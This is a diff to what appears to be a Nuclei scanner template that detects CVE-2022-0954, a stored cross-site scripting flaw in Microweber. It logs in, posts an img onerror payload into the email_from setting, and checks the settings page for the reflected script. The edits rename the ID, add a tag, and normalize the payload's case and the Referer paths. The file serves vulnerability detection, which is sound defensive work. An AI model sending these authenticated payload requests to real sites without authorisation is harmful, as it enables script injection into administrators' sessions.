@@ -1,4 +1,4 @@
-id: stored-xss-mwb
+id: microweber-stored-xss
 
 info:
   name: Microweber - Cross-site Scripting
@@ -14,7 +14,7 @@ info:
     cvss-score: 6.8
     cwe-id: CWE-79
     cve-id: CVE-2022-0954
-  tags: cve,cve2022,xss,microweber
+  tags: cve,cve2022,xss,microweber,authenticated
 
 requests:
   - raw:
@@ -26,30 +26,28 @@ requests:
         username={{username}}&password={{password}}
 
       - |
-        POST /api/save_option HTTP/2
+        POST /api/save_option HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-        Referer: {{BaseURL}}/admin/view:settings
+        Referer: {{BaseURL}}admin/view:settings
 
-        option_key=email_from&option_group=email&option_value=%22%3E%3CiMg+SrC%3D%22x%22+oNeRRor%3D%22alert(document.domain)%3B%22%3E&module=settings%2Fgroup%2Femail
+        option_key=email_from&option_group=email&option_value=%22%3E%3Cimg+src%3D%22x%22+onerror%3D%22alert(document.domain)%3B%22%3E&module=settings%2Fgroup%2Femail
 
       - |
         POST /module/ HTTP/2
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-        Referer: {{BaseURL}}/admin/view:shop/action:options
+        Referer: {{BaseURL}}admin/view:shop/action:options
 
         module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend&class=card-body+pt-3&option_group=email&is_system=1&style=position%3A+relative%3B
 
     req-condition: true
     cookie-reuse: true
-
-    matchers-condition: or
     matchers:
       - type: dsl
         dsl:
           - 'contains(body_2,"true")'
-          - contains(body_3,'\"><iMg SrC=\"x\" oNeRRor=\"alert(document.domain);\">\" placeholder=\"Ex')
+          - contains(body_3,'\"><img src=\"x\" onerror=\"alert(document.domain);\">\" placeholder')
           - 'contains(all_headers_3,"text/html")'
           - 'status_code_3==200'
         condition: and
